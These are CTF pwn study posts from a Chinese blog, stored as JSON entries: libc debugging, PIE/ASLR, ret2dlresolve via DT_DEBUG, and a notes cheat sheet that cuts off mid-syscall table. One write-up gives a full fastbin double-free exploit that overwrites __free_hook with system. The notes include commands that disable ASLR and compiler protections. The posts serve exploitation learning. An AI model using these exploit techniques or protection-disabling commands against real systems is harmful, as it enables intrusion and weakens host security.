它并不是无缘无故消失的，我大致分析了一下原因。之前我做题时试图切换libc版本，然后在镜像站下载了（应该）带调试符号的libc-2.27.so。但是并不是很清楚，所以喊来了pwn爷爷，pwn爷爷并不熟悉我的电脑，一通操作猛如虎，干了啥我也不知道，反正好像是把libc丢进了根目录。 可能就是在那会儿，新下载的libc和已有的libc产生了冲突，然后启动了什么奇怪的过程，把libc彻底搞崩了。 但是这个pwn大哥完全没锅，因为挺有趣的其实。 然后大致明了的问题的方向我开始寻找解决方案。 虽然pwn大哥不费吹灰之力帮我重新装了一个系统并且完善好了环境，但是还有一个报废的系统等着我蹂躏呢（） 2)record记录一下所有调教的操作。 普通地在/usr/lib/x86_64-linux-gnu文件夹中添加ld，无效。 普通地在/usr/lib/x86_64-linux-gnu文件夹中添加带有调试符号的libc，无效。 等等为什么ld和libc都没了。。 12345pwndbg: created $rebase, $ida gdb functions (can be used with print/break)Reading symbols from ./worldline...done.Attaching to program: /home/fur1n/pwn/heap/merely_game/wordline/worldline, process 12250Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...warning: the debug information found in &quot;/usr/lib/debug//lib/x86_64-linux-gnu/libc-2.27.so&quot; does not match &quot;/lib/x86_64-linux-gnu/libc.so.6&quot; (CRC mismatch) 好嘛。 About CRC ErrorsA CRC error indicates that some data in your Zip file (.zip or .zipx) is damaged. CRC stands for cyclic redundancy check. It is a calculation made from all the data in a file to insure accuracy. When you add a file to a Zip file, WinZip calculates a CRC value for the file and saves the value in the Zip file. When you later extract the file from the Zip file, WinZip calculates the CRC of the extracted file and compares it to the value stored when the file was zipped. If these two CRC values do not match, the file that was extracted does not match the original file, and WinZip will display a CRC Error message. When the data in a Zip file is damaged, it may not be possible to extract all of the files from the Zip file correctly. Damaged data can affect the entire Zip file, multiple files, or just one file. crc的官方定义是文件被损坏导致错误，但是实际并没有损坏。。感觉并不是可以随便解决的问题 ​ 3.替换libc.so.6文件。他不是不匹配嘛，不匹配我就弄个匹配的。结果无效。 查了一下，查出一堆奇怪的问题。网上大多都是完全无法调试，但是我这就很离谱。 难道只能硬啃那个又臭又长的gdb的文档吗？ 18.3 Debugging Information in Separate Files GDB supports two ways of specifying the separate debug info file: The executable contains a debug link that specifies the name of the separate debug info file. The separate debug file’s name is usually executable.debug, where executable is the name of the corresponding executable file without leading directories (e.g., ls.debug for /usr/bin/ls). In addition, the debug link specifies a 32-bit Cyclic Redundancy Check (CRC) checksum for the debug file, which GDB uses to validate that the executable and the debug file came from the same build. The executable contains a build ID, a unique bit string that is also present in the corresponding debug info file. (This is supported only on some operating systems, when using the ELF or PE file formats for binary files and the GNU Binutils.) For more details about this feature, see the description of the –build-id command-line option in Command Line Options in The GNU Linker. The debug info file’s name is not specified explicitly by the build ID, but can be computed from the build ID, see below. 在某些系统中（比如我们的ubunut），由于调试文件可能比可执行程序都大，所以通常将可执行文件以及调试文件分开存放。一般来说调试信息 的后缀是.debug。 gdb支持两种寻找调试info文件的方式。 一种是可执行文件包含指向调试信息文件的路径。就比如ls在 /usr/bin/ls)中，同时这个文件夹还包含ls.debug文件。 然后调试链接器还通过crc检查来使来源于同一个编译的可执行文件和调试文件生效。 此外还有就是通过匹配build ID来指定。关于build ID，这个确实是有的。 然后当可执行文件已经指定好调试文件，gdb还需要去寻找它。就像小张跟小静说我要找小王，小静只是知道他需要找到小王，但是还不知道怎么找。 Depending on the way the debug info file is specified, GDB uses two different methods of looking for the debug file: For the “debug link” method, GDB looks up the named file in the directory of the executable file, then in a subdirectory of that directory named .debug, and finally under each one of the global debug directories, in a subdirectory whose name is identical to the leading directories of the executable’s absolute file name. (On MS-Windows/MS-DOS, the drive letter of the executable’s leading directories is converted to a one-letter subdirectory, i.e. d:/usr/bin/ is converted to /d/usr/bin/, because Windows filesystems disallow colons in file names.) For the “build ID” method, GDB looks in the .build-id subdirectory of each one of the global debug directories for a file named nn/nnnnnnnn.debug, where nn are the first 2 hex characters of the build ID bit string, and nnnnnnnn are the rest of the bit string. (Real build ID strings are 32 or more hex characters, not 10.) So, for example, suppose you ask GDB to debug /usr/bin/ls, which has a debug link that specifies the file ls.debug, and a build ID whose value in hex is abcdef1234. If the list of the global debug directories includes /usr/lib/debug, then GDB will look for the following debug information files, in the indicated order: - /usr/lib/debug/.build-id/ab/cdef1234.debug - /usr/bin/ls.debug - /usr/bin/.debug/ls.debug - /usr/lib/debug/usr/bin/ls.debug. 一个就是普通的在子目录中寻找对应的文件， 另外一个根据build ID，在名为.build-id的子目录中寻找build ID对应的文件夹。 也就是说如果要调试 /usr/bin/ls 1234/usr/lib/debug/.build-id/ab/cdef1234.debug/usr/bin/ls.debug/usr/bin/.debug/ls.debug/usr/lib/debug/usr/bin/ls.debug. 这四种路径都能帮助gdb找到对应的调试文件。 所以无论如何实际上没有解决任何问题。比如我找到的在stackoverflow上的相同报错，基本上都是在对应文件夹中缺少他编译文件的.debug文件，但是这个和我感觉咩有关系。因为感觉libc这种本来就是咩有debug文件的。。。。 网上也一会儿找不到和我相同的情况。好离谱 我只能暂且顺着这个思路走一走，看看能不能添加什么libc-2.27.so的debug文件。但是好奇怪，就算缺少也应该是我们需要调试的程序缺少调试文件，为什么是libc缺少调试文件，难道我们调的不是程序而是libc？ 就跟之前我看那个源码级调试堆题，給的源码也是malloc的源码。 对了，18.04的应该是把debug信息一起整合到了一个叫debug的文件夹里/usr/lib/debug 里面感觉和libc如出一撤，所以我才猜测这就是对应的所谓的调试信息。 然后检查发现都比较完善，没有缺少什么。 这就很怪了。 想一下，之前报错就是说libc.so.6和libc的调试文件不匹配 12warning: the debug information found in &quot;/usr/lib/debug//lib/x86_64-linux-gnu/ld-2.27.so&quot; does not match &quot;/lib64/ld-linux-x86-64.so.2&quot; (CRC mismatch).warning: the debug information found in &quot;/usr/lib/debug//lib/x86_64-linux-gnu/libc-2.27.so&quot; does not match &quot;/lib/x86_64-linux-gnu/libc.so.6&quot; (CRC mismatch). /lib64/ld-linux-x86-64.so.2是一个软连接，在这里链接的是/lib/x86_64-linux-gnu/ld-2.27.so,也就相当于ld-2.27.so","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"ELF文件下对于PIE保护和ASLR的重新认识","slug":"mess_ELF文件下对于PIE保护和ASLR的重新认识","date":"2021-08-13T07:06:00.000Z","updated":"2022-04-09T08:38:36.219Z","comments":true,"path":"2021/08/13/mess_ELF文件下对于PIE保护和ASLR的重新认识/","link":"","permalink":"https://fuurinko.github.io/2021/08/13/mess_ELF%E6%96%87%E4%BB%B6%E4%B8%8B%E5%AF%B9%E4%BA%8EPIE%E4%BF%9D%E6%8A%A4%E5%92%8CASLR%E7%9A%84%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86/","excerpt":"","text":"ELF文件下对于PIE保护和ASLR的重新认识0）​ 复现红色高跟鞋的时候，在ida修复swithc结构的时候碰见了一个问题。因为题目的源文件是有pie保护的，所以ida中的地址是很难看的随机化模式。虽然这些随机化的地址对于我们patch文件毫无影响，但是就是突发奇想，看看能不能找到方法来通过patch将elf文件的pie保护给禁用。 1）​ 如果用010editor打开一个PE文件，我们能够很方便的通过修改PE头来禁用掉Windows程序的ASLR保护。这是因为程序本身其实并不是位置无关的。 ASLR在PE文件上的开启与否实际上就是PE头上标识符的区分，总的来说ASLR是操作系统的功能，而不是程序本身的特性，以ASLR ON 编译，也只是给程序加上了能被ASLR保护识别的标识符。所以我们只需要patch掉这个标识符，就能够改变程序的地址随机化状态。 也正是在寻找方法的过程中，我逐渐认识到虽然PIE保护和ASLR表现形式都是地址随机化，但是两者的原理以及实现的方式并不一样，甚至大相径庭。 在维基百科上，我们能够清楚地看到PIE的全称是Position-independence Executable，位置无关可执行文件。 这个概念并不是很常见，相对更为常见的是PIC，Position-independence Code，位置无关代码。 PIC和PIE只差了一个字母，意思也相近。但PIC更多的是在重定位中被提及。源码通过汇编器生成可重定位目标文件，此时它的代码就是位置无关，从0开始的，PIE和PIC的概念相近，当编译完成，可执行文件的便是位置无关了，我们无法改变这一点，也就是说，被PIE保护的文件，并不是通过给头文件加上标识符，使系统开启或关闭随机，而是文件本身便是位置无关吗，是随机的。 ​ 然而，虽然文件本身是位置无关的，但是实际地址是否随机，还是要看进程中aslr是否开启，如果将进程aslr关闭，那么调试时我们看到的地址依旧不是随机的。这里主要涉及到重定位的相关知识，之后会写一篇笔记来试图深入系统重定位过程与地址随机化之间的关系。","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"pwn题中的一些奇怪的姿势","slug":"sum_pwn题中的一些奇怪的姿势","date":"2021-08-03T06:56:14.000Z","updated":"2022-04-15T07:14:45.909Z","comments":true,"path":"2021/08/03/sum_pwn题中的一些奇怪的姿势/","link":"","permalink":"https://fuurinko.github.io/2021/08/03/sum_pwn%E9%A2%98%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%80%AA%E7%9A%84%E5%A7%BF%E5%8A%BF/","excerpt":"","text":"patch alarm比较弱智的一个操作，但是如果没注意到的话还是有一点点坑。 一般来说许多题都喜欢在main函数里加alarm。 alarm会导致调试的时候超时，如果没有解决的话基本不能调试。算最基础的的反调试手法了。 ps:关于超时的那个报错当时还好好研究了一会儿来着。就是一个sigxxx，sigalarm好像，然后默认返回中止程序。 解决方案也比较弱智。就是直接patch掉就好了。 ida都关了懒得上图了。 单双引号问题​ 萌新赛出题的时候，出了一道非常简单的签到ret2text，但是非常疑惑地，怎么样都会EOF。 ​ 然后索性调试一下，发现了奇点。 ​ ​ 这边已经跳转到后门函数了，但是没有办法getshell。问题似乎出在参数上。本应该是/bin/sh，但是实际是n/sh，只有后面四个字节了。 ​ 我去找了wiki上面类似题目做参考，发现正常情况下这里应该是这样： ​ 但是我的程序是这样： ​ 然后发动传统艺能，控制变量找不同，发现问题出在system(&#39;/bin/sh&#39;)上。 ​ 因为不怎么出这种直接给后门的题，我甚至不太清楚这个函数的写法，以至于想当然地认为这里单引号和双引号没有什么区别，就像在exp中的那些(&#39;./&#39;) (&quot;./&quot;)，看起来区别不大，实际上也没有什么影响。 ​ 但是实际只要去查一查，就会发现其实区别很大。单引号压根就不是字符串。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。 ​ 然后把单引号改成双引号之后，就getshell了。 roputils做ret2dl的时候难免会偷懒使用工具。 但是这个工具并没有看起来那么和善。 就怎么使用utils包我都研究了一会儿，然后发现只需要import roputils然后把相对应的那个py脚本放到同一路径下就好。 但是紧接着第二问个问题，这个py脚本通篇是python2，而我日常无论哪个系统都是py3。 所以解决方式有2 将roputils转换为py3 ubuntu切换py版本 反正第一种就是用一个叫2to3的脚本。是py2自带的，使用需要先安装py2.7，我ubuntu18.04自带py2.7，所以就直接2to3 -w roputils.py 具体参数可以google。 然后又来了第三个问题。 来看我的报错。 1234567891011[+] Starting local process &#x27;./babystack&#x27;: pid 745Traceback (most recent call last): File &quot;babystack.py&quot;, line 23, in &lt;module&gt; rop = roputils.ROP(&#x27;./babystack&#x27;) File &quot;/home/fur1n/pwn/week1/roputils.py&quot;, line 440, in __init__ ELF.__init__(self, *args, **kwargs) File &quot;/home/fur1n/pwn/week1/roputils.py&quot;, line 85, in __init__ m = re.search(r&#x27;^\\s*(?P&lt;key&gt;[^:]+):\\s+(?P&lt;value&gt;.+)$&#x27;, line) File &quot;/usr/lib/python3.6/re.py&quot;, line 182, in search return _compile(pattern, flags).search(string)TypeError: cannot use a string pattern on a bytes-like object 这个功能好像并不会在byte前加b。。。 目前来说并没有发现解决方法。 所以只能尝试更换默认的py版本。具体可以google main_arena与多线程在学习Tcache的时候遇到了一些比较奇怪的点，ctf权威指南pwn篇中对于Tcache的解释中第一段如下： Tcache全名为Thread Local Caching，它为每个线程创建一个缓存，里面包含了一些小堆块，无需对main_arena上锁即可使用。 首先让我感到不解的就是，“无需对main_arena上锁即可使用”这句话。什么叫对main_arana上锁？之前也遇见过很多文章提到过这个”锁“的相关概念，但是它们从来都不是问题的重点，但是通常来说，正是一个个不懂的”无关紧要“的问题导致最后啥也看不懂的。 所以在这篇文章中我们有必要从ctf pwn的角度去理解线程 main_arena。 加锁当多个线程同时操作同一个共享全局变量的时候，对线程上锁，保证同一时间一个对象只有一个线程在访问，可以解决资源占用问题，同时保证了数据的安全性。 线程线程一般来说被进程包含：一个进程可以有很多线程来处理，每条线程并行执行不同的任务。 比如说ptmalloc2这个是个进程，然后其中包含很多很多线程。 其中会有一个main_arena,是整个ptmalloc2进程中的主线程，然后main_arena会有很多子线程，每个子线程包含很多连续的内存片段，被称为heap。每一个heap都有自己的heap_header，它们通过链表互相连接，且其中保存了指向其所属arena的指针。 这么讲似乎有一些太过抽象。具体一点讲就是，在只有一个main_arena的时候，ptmalloc只能通过mmap和sbrk申请堆内存。 在多线程的情况下，显然让所有的线程公用一个数据结构来获取内存块会造成十分惨烈的对锁的竞争，所以 ptmalloc 中间多了一层组织结构——arena。每个arena包含一些可用的内存区块，用一个 arena 级别的锁来控制访问。当线程比较少的时候，每个可以拥有自己的arena，而当 arena 数目超过允许最大值时，多个线程共享一个 arena 了。个线程第一次 malloc 的时候都会 attach 一个 arena 。除非这个 arena 被标记为破坏的（ARENA_CORRUPTION_BIT），否则该线程以后再 malloc 都会继续用这个 arena。 之前ctf权威指南中有讲到，每一个子线程包含很多连续的内存片段，被称为heap。它们都有自己所属的arena。这句话很容易让人觉得——每一个子线程有且只有一个arena，但是还存在多对一的情况。 但是对于ctf pwn来说，实际情况远远没有这么复杂，基本我们操作的所谓的堆，chunk这些概念，考点基本都是建立在单线程的情况下的，它们的arena也都是main_arena而并不是什么non_main_arena。并且只有main_arena 能够访问heap段，non_main_arena只能访问mmap映射区域。 总结用比较简单的话来说，main_arena就是主线程中一个管理所有链表的关键的数据结构，我们可以通过它获得各个bins的偏移。以及利用指向它的fd来做一些不好的事情（）。承接之前的内容，我们在利用main_arena的同时也需要对其进行上锁，防止别的线程与它共用一个资源，然后之前Tcahce里的“无需对main_arena上锁”意思也很清楚了，因为考虑到效率。所以抛弃了一定的安全性。 参考malloc x 线程 GLibcHeap","categories":[{"name":"Generalization","slug":"Generalization","permalink":"https://fuurinko.github.io/categories/Generalization/"}],"tags":[{"name":"sum","slug":"sum","permalink":"https://fuurinko.github.io/tags/sum/"}]},{"title":"ret2dl_advanced","slug":"stack_ret2dl_advanced","date":"2021-08-02T03:22:53.000Z","updated":"2022-10-24T01:46:16.736Z","comments":true,"path":"2021/08/02/stack_ret2dl_advanced/","link":"","permalink":"https://fuurinko.github.io/2021/08/02/stack_ret2dl_advanced/","excerpt":"","text":"ret2dl_advanced1)review当FULL RELRO保护开启时，通过 dl_run_time来获取libc基址的方式几乎无解。 但是我们仍然能够找到某种方式来getshell。 相关论文中给出一种解决方案，即通过dt_bug入口找到突破点。 (Ps:为什么找不到相关的中文文章) 2）dt_dbg？dt_dbg这个概念实际上并不新鲜，简单来说它可以被包含在libc.so文件中，比如我们指定一个特定的libc版本加载的时候，通常除了程序本体还要附加一个libc文件，有时我们的debug信息就包含在这个libc.so文件中。但是有的libc.so文件是不包含debug信息的。所以如果我们程序的libc没有dbg文件那这个方法也没用了。 dt_dubug用于指向type_r_debug这个结构体。这个结构体用来保存调试器需要的信息来确认动态装载器的基址和拦截一些特定的与动态装载相关的事件。 此外，这个结构体的r_map域保存了指向link_map的链接表表头的指针。 也就是dt_dbg指向type_r_debug，且type_r_debug维护了指向link_map的指针。 r_debug具体代码如下: 1234567891011121314151617181920/* Rendezvous structure used by the run-time dynamic linker to communicate details of shared object loading to the debugger. If the executable&#x27;s dynamic section has a DT_DEBUG element, the run-time linker sets that element&#x27;s value to the address where this structure can be found. */struct r_debug &#123; int r_version; /* Version number for this protocol. */ struct link_map *r_map; /* Head of the chain of loaded objects. */ /* This is the address of a function internal to the run-time linker, that will always be called when the linker begins to map in a library or unmap it, and again when the mapping change is complete. The debugger can set a breakpoint at this address if it wants to notice shared object mapping changes. */ ElfW(Addr) r_brk; enum &#123; /* This state value describes the mapping change taking place when the `r_brk&#x27; address is called. */ RT_CONSISTENT, /* Mapping change is complete. */ RT_ADD, /* Beginning to add a new object. */ RT_DELETE /* Beginning to remove an object mapping. */ &#125; r_state; ElfW(Addr) r_ldbase; /* Base address the linker is loaded at. */ &#125;; 实操一遍 随便写一个无output的栈溢出。 12345678fur1n@ubuntu:~/pwn$ readelf -d ret2dlDynamic section at offset 0xdb8 contains 27 entries: Tag Type Name/Value... 0x0000000000000015 (DEBUG) 0x0 在没有运行的时候dt_dbg为空。 在关闭aslr的情况下找到dt_debug并不困难。 gdb使用elfheader命令查看相关elfheader的地址，可以找到.dynamic 段的地址。 123pwndbg&gt; x/50gx 0x600e20...0x600ee0: 0x0000000000000015 0x00007ffff7ffe140 0x00007ffff7ffe140也就是dt_debug指向的r_debug的地址。 123456789101112pwndbg&gt; x/20gx 0x00007ffff7ffe1400x7ffff7ffe140 &lt;_r_debug&gt;: 0x0000000000000001 0x00007ffff7ffe1700x7ffff7ffe150 &lt;_r_debug+16&gt;: 0x00007ffff7de3f40 0x00000000000000000x7ffff7ffe160 &lt;_r_debug+32&gt;: 0x00007ffff7dd3000 0x00000000000000000x7ffff7ffe170: 0x0000000000000000 0x00007ffff7ffe7000x7ffff7ffe180: 0x0000000000600e20 0x00007ffff7ffe7100x7ffff7ffe190: 0x0000000000000000 0x00007ffff7ffe1700x7ffff7ffe1a0: 0x0000000000000000 0x00007ffff7ffe6e80x7ffff7ffe1b0: 0x0000000000000000 0x0000000000600e200x7ffff7ffe1c0: 0x0000000000600f00 0x0000000000600ef00x7ffff7ffe1d0: 0x0000000000000000 0x0000000000600ea0 r_debug维护的第一个结构体，也就是link_map地址，即0x00007ffff7ffe170 10x7ffff7ffe140 &lt;_r_debug&gt;: 0x0000000000000001 0x00007ffff7ffe170 这样我们就从dt_debug找到了link_map的地址。 虽然但是。 只是找到link_map没啥用。 我们的最终目的还是寻找到dl_runtime_resolve函数的地址，当地址被找到那么之后的操作就是常规的ret2dl了。 能从动态链接库中找到dl_runtime_resolve函数地址的原理大致是Full RELRO保护只对main excutable生效，而动态链接库并不受它保护。这就意味着我们如果能够通过动态链接库来找到dl_runtime_resolve函数地址，那么问题就迎刃而解了。 那么如何寻找呢？ 实际比较简单（无aslr的情况），只要根据link_map的结构依次顺下来就好了。 上一个section我们找到了link_map的地址，接下来我们通过link_map逐步找到 dl_runtime_resolve。 首先我们找到libc.so.6文件。 123456789101112131415161718192021pwndbg&gt; x/20gx 0x00007ffff7ffe1700x7ffff7ffe170: 0x0000000000000000 0x00007ffff7ffe7000x7ffff7ffe180: 0x0000000000600e20 0x00007ffff7ffe710---pwndbg&gt; x/20gx 0x00007ffff7ffe7000x7ffff7ffe700: 0x0000000000000000 0x00000000000000000x7ffff7ffe710: 0x00007ffff7ffb000 0x00007ffff7ffebb0---pwndbg&gt; x/s 0x00007ffff7ffebb00x7ffff7ffebb0: &quot;linux-vdso.so.1&quot;---pwndbg&gt; x/10gx 0x00007ffff7ffe7100x7ffff7ffe710: 0x00007ffff7ffb000 0x00007ffff7ffebb00x7ffff7ffe720: 0x00007ffff7ffb3a0 0x00007ffff7fe2000---pwndbg&gt; x/10gx 0x00007ffff7fe20000x7ffff7fe2000: 0x00007ffff79e2000 0x00007ffff7ffedd0---pwndbg&gt; x/s 0x00007ffff7ffedd00x7ffff7ffedd0: &quot;/lib/x86_64-linux-gnu/libc.so.6&quot; 即0x00007ffff7ffedd0。 0x3即GOT[]入口 1234pwndbg&gt; x/30gx 0x00007ffff7dccb80...0x7ffff7dccc30: 0x0000000000000003 0x00007ffff7dcd000 找到GOT[3] 123pwndbg&gt; x/5gx 0x00007ffff7dcd0000x7ffff7dcd000: 0x00000000003eab80 0x00007ffff7fe20000x7ffff7dcd010: 0x00007ffff7dea8f0 0x00007ffff7b70a10 123456789101112131415pwndbg&gt; xinfo 0x00007ffff7dea8f0Extended information for virtual address 0x7ffff7dea8f0: Containing mapping: 0x7ffff7dd3000 0x7ffff7dfc000 r-xp 29000 0 /lib/x86_64-linux-gnu/ld-2.27.so Offset information: Mapped Area 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0 File (Base) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0 File (Segment) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0 File (Disk) 0x7ffff7dea8f0 = /lib/x86_64-linux-gnu/ld-2.27.so + 0x178f0 Containing ELF sections: .text 0x7ffff7dea8f0 = 0x7ffff7dd3f10 + 0x169e0 3）exploitation在无aslr并已经获取到dl_runtime_resolve的情况下的利用和patial relro相似。 有aslr的情况。。 我也不会。 4)refrence通过DT_DEBUG来获得各个库的基址 How the ELF Ruined Christmas Finding link_map and _dl_runtime_resolve() under full RELRO ————————————————tbc——————————————————-","categories":[{"name":"STACK - ret2dlresolve","slug":"STACK-ret2dlresolve","permalink":"https://fuurinko.github.io/categories/STACK-ret2dlresolve/"}],"tags":[{"name":"stack","slug":"stack","permalink":"https://fuurinko.github.io/tags/stack/"}]},{"title":"Message","slug":"heap_challenge_message","date":"2021-05-24T09:18:33.269Z","updated":"2022-04-24T06:53:13.021Z","comments":true,"path":"2021/05/24/heap_challenge_message/","link":"","permalink":"https://fuurinko.github.io/2021/05/24/heap_challenge_message/","excerpt":"","text":"第二道fastbin double free。 123free(*(void **)&amp;dword_602060[4 * v1 + 2]); dword_602060[4 * v1] = 0; --dword_60204C; 这里没有把指针置为null，所以会产生uaf漏洞。 ida大体分析了一下就会发现，由于没有后门函数，这道题会比上一道难。而且由于RELRO的开启，got所在的数据段是只读的，这里研究一下relro这个保护。 uaf漏洞的利用方式有多种，其中就有修改got表达到任意地址写，从而getshel。但是RELRO这个保护，通过将got表所在的地址变成只读，有效阻止了got表覆盖攻击。 所以说这道题我们不能用覆盖got表的方式来getshell，而是需要用freehook劫持的方式。 大体思路是先通过fastbin double free构造fake chunk指向储存chunk的content的地址并泄露puts函数的真实地址，再获得libc基址，借此修改freehook，使它指向system并调用。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *from LibcSearcher import *#p = remote(&#x27;124.70.35.238&#x27;,23717)p = process(&#x27;./message&#x27;)context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;./message&#x27;)def add(size,content = b&#x27;a&#x27;): p.sendafter(&#x27;:&#x27;,&#x27;1&#x27;) p.sendafter(&#x27;:&#x27;,str(size)) p.sendafter(&#x27;:&#x27;,content)def free(idx): p.sendafter(&#x27;:&#x27;,&#x27;2&#x27;) p.sendafter(&#x27;:&#x27;,str(idx))def edit(idx,content): p.sendafter(&#x27;:&#x27;,&#x27;3&#x27;) p.sendafter(&#x27;:&#x27;,str(idx)) p.sendafter(&#x27;:&#x27;,content)def show(idx): p.sendafter(&#x27;:&#x27;,&#x27;4&#x27;) p.sendafter(&#x27;:&#x27;,str(idx))#gdb.attach(p)add(0x30)#chunk0,set as the fake chunkadd(0x20)#chunk1add(0x20)#chunk2free(1)free(2)free(1)#fastbin: chunk1--&gt;chunk2--&gt;chunk1fake_chunk_addr = 0x602060 - 0x8add(0x20,p64(fake_chunk_addr))#chunk3--&gt;1#fastbin: fake_chunk--&gt;chunk1--&gt;chunk2--&gt;chunk1add(0x20)#chunk4--&gt;2add(0x20)#chunk5--&gt;1add(0x20,p64(elf.got[&#x27;puts&#x27;]))#chunk6..&gt;fake chunk#leak the addressshow(0)puts = u64(recv(6))libc = LibcSearcher(&#x27;puts&#x27;, puts)libc_base = puts - libc.dump(&#x27;puts&#x27;)system = libc_base + libc.dump(&#x27;system&#x27;)free_hook = libc_base + libc.dump(&#x27;__free_hook&#x27;)edit(6,p64(free_hook))edit(0,p64(system))#free_hook = systemadd(0x8,&#x27;/bin/shx00&#x27;)free(7)#process system(/bin/sh)","categories":[{"name":"HEAP - Fastbin Attack","slug":"HEAP-Fastbin-Attack","permalink":"https://fuurinko.github.io/categories/HEAP-Fastbin-Attack/"}],"tags":[{"name":"UAF","slug":"UAF","permalink":"https://fuurinko.github.io/tags/UAF/"}]},{"title":"杂碎的指令","slug":"sum_杂碎的指令","date":"2021-04-23T16:50:26.062Z","updated":"2022-04-09T08:36:41.320Z","comments":true,"path":"2021/04/24/sum_杂碎的指令/","link":"","permalink":"https://fuurinko.github.io/2021/04/24/sum_%E6%9D%82%E7%A2%8E%E7%9A%84%E6%8C%87%E4%BB%A4/","excerpt":"","text":"[TOC] 杂碎的知识点1）调试相关1）gdbropgagdet ROPgadget –binary （） –only “pop|ret” | grep rdi (基本适用于ret2csu这种万能gagdet的寻找) 例如ROPgadget --binary calc --only &quot;pop|ret&quot; | grep eax 2）内存断点？硬件断点？原理对所访问内存地址设置为不可读写，当访问时触发中断。 设置方式参见pwndbg那张巨长的图。 watch 0x123456 watch a 加载调试符号​ 对于没有stripped的程序，抽取制作调试符号： 12objcopy --only-keep-debug ELF_DEBUG xx.symbol ​ 加载符号表 12gdb --symbol=xx.symbol -exec=ELF_RELEASE 或者直接利用有调试符号的elf作为符号表来源 12gdb --symbol=ELF -exec=ELF_RELEASE 直接为ELF文件添加符号表链接 1objcopy --add-gnu-debuglink=xx.symbol ELF_RELEASE 关闭系统环境地址随机化1echo 0 &gt;/proc/sys/kernel/randomize_va_space 打开则设置为2。 2）汇编指令跳转指令1234567891011121314151617181920212223242526272829303132333435363738394041424344JE ;等于则跳转JNE ;不等于则跳转JZ ;为 0 则跳转JNZ ;不为 0 则跳转JS ;为负则跳转JNS ;不为负则跳转JC ;进位则跳转JNC ;不进位则跳转JO ;溢出则跳转JNO ;不溢出则跳转JA ;无符号大于则跳转JNA ;无符号不大于则跳转JAE ;无符号大于等于则跳转JNAE ;无符号不大于等于则跳转JG ;有符号大于则跳转JNG ;有符号不大于则跳转JGE ;有符号大于等于则跳转JNGE ;有符号不大于等于则跳转JB ;无符号小于则跳转JNB ;无符号不小于则跳转JBE ;无符号小于等于则跳转JNBE ;无符号不小于等于则跳转ps:；rax = 2cmp rax,1; =&gt;jumpJL ;有符号小于则跳转JNL ;有符号不小于则跳转JLE ;有符号小于等于则跳转JNLE ;有符号不小于等于则跳转JP ;奇偶位置位则跳转JNP ;奇偶位清除则跳转JPE ;奇偶位相等则跳转JPO ;奇偶位不等则跳转 函数调用栈Leave等价于： 12mov esp ebppop ebp retn=pop eip（ret是回到函数调用前的下一条指令，ret指令等于将esp的贮存值（也就是栈·顶弹出）赋给eip，然后esp+4，由于esp中贮存的是函数调用前的下一条指令的地址，所以自然而然能够返回） 但是为什么esp里面会贮存函数调用前的下一条指令的地址呢？ 这里要注意调用者函数和被调用者函数的栈桢是不同的。每一个发生一个函数调用就会产生一个新的栈帧。 call指令调用一个过程，指挥处理器从新的内存地址开始执行。过程使用RET（从过程返回）指令将处理器转回到该过程被调用的程序点上。从物理上来说，CALL指令将其返回地址压入堆栈，再把被调用过程的地址复制到指令指针寄存器。当过程准备返回时，它的RET指令从堆栈把返回地址弹回到指令指针寄存器。 ​ 《cs：app》page：114 （ps：csapp中的堆栈单纯指栈而不指堆） 在这里当函数被调用，函数调用前的下一条指令的地址被作为esp的值被压栈了。也就是函数调用的第一句：push esp 。函数被调——》 被调用函数栈帧压入调用栈。 建立新的栈帧，把被调函数的栈帧栈底地址放入bp中 =〉push rbp ​ mov rbp， rsp 3）编译指令1）gcc编译普通的编译（默认保护全开）】gcc test.c -o test 禁用PIE gcc -z -no-pie test.c -o test 禁用RELRO gcc -z norelro x x x.c -o xxx 禁用Canary -fno-stack-protector 禁用NX gcc -z execstack -o test test.c 所以保护全关的命令： 1gcc -fno-stack-protector -z execstack -z norelro -no-pie test.c -o test 4）linux系统调用号1）32bit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381#ifndef _ASM_X86_UNISTD_32_H#define _ASM_X86_UNISTD_32_H 1#define __NR_restart_syscall 0#define __NR_exit 1#define __NR_fork 2#define __NR_read 3#define __NR_write 4#define __NR_open 5#define __NR_close 6#define __NR_waitpid 7#define __NR_creat 8#define __NR_link 9#define __NR_unlink 10#define __NR_execve 11#define __NR_chdir 12#define __NR_time 13#define __NR_mknod 14#define __NR_chmod 15#define __NR_lchown 16#define __NR_break 17#define __NR_oldstat 18#define __NR_lseek 19#define __NR_getpid 20#define __NR_mount 21#define __NR_umount 22#define __NR_setuid 23#define __NR_getuid 24#define __NR_stime 25#define __NR_ptrace 26#define __NR_alarm 27#define __NR_oldfstat 28#define __NR_pause 29#define __NR_utime 30#define __NR_stty 31#define __NR_gtty 32#define __NR_access 33#define __NR_nice 34#define __NR_ftime 35#define __NR_sync 36#define __NR_kill 37#define __NR_rename 38#define __NR_mkdir 39#define __NR_rmdir 40#define __NR_dup 41#define __NR_pipe 42#define __NR_times 43#define __NR_prof 44#define __NR_brk 45#define __NR_setgid 46#define 